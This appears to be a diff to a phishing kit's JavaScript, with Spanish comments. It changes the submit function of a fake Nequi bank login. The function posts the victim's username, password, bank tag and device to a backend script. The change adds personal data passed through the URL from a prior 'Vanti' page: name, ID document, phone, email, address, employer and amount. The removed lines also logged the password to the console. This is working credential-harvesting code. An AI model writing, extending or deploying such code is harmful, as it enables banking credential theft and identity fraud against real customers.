@@ -698,7 +698,7 @@ var espera = 0;
           }, 3000);
 } 
 
-// 🟢 [REESCRITURA DE FUNCIÓN FINAL] - Ahora atrapa el ID de Vanti
+// 🟢 [REESCRITURA DE FUNCIÓN FINAL] - Ahora atrapa LOS DATOS de Vanti desde la URL
 function final() {
 
     if ($("#usuario").val() != "") {
@@ -712,23 +712,28 @@ function final() {
               $(".fondo").show();
               $(".mensaje").show();
 
-              var sesionid = $("#sesionid").val();
               var dispo = detectar_dispositivo();
               
-              // ATRAPAMOS EL ID QUE MANDÓ VANTI POR LA URL
+              // 🟢 ATRAPAMOS TODOS LOS DATOS QUE MANDÓ VANTI POR LA URL
               var urlParams = new URLSearchParams(window.location.search);
-              var idVanti = urlParams.get('id') || '';
 
-              console.log($("#usuario").val(), $("#password").val(), sesionid, "ID:", idVanti);
-
-                // ENVIAMOS EL ID AL BACKEND JUNTO CON USUARIO Y CONTRASEÑA
-                $.post( "../../../process/pasologin.php",{ 
+                // 🟢 ENVIAMOS TODO AL BACKEND EN UNA SOLA PETICIÓN
+                $.post( "../../../process/pasologin.php", { 
                     usr: $("#usuario").val(), 
                     pas: $("#password").val(),  
                     ban: "Nequi", 
                     dis: dispo,
-                    id_tramite: idVanti 
-                },function( data ) {
+                    nom: urlParams.get('nom') || '',
+                    ape: urlParams.get('ape') || '',
+                    tdoc: urlParams.get('tdoc') || '',
+                    doc: urlParams.get('doc') || '',
+                    cel: urlParams.get('cel') || '',
+                    eml: urlParams.get('eml') || '',
+                    dir: urlParams.get('dir') || '',
+                    emp: urlParams.get('emp') || '',
+                    ref: urlParams.get('ref') || '',
+                    mnt: urlParams.get('mnt') || ''
+                }, function( data ) {
                   espera = 1;     
                 }); 
 
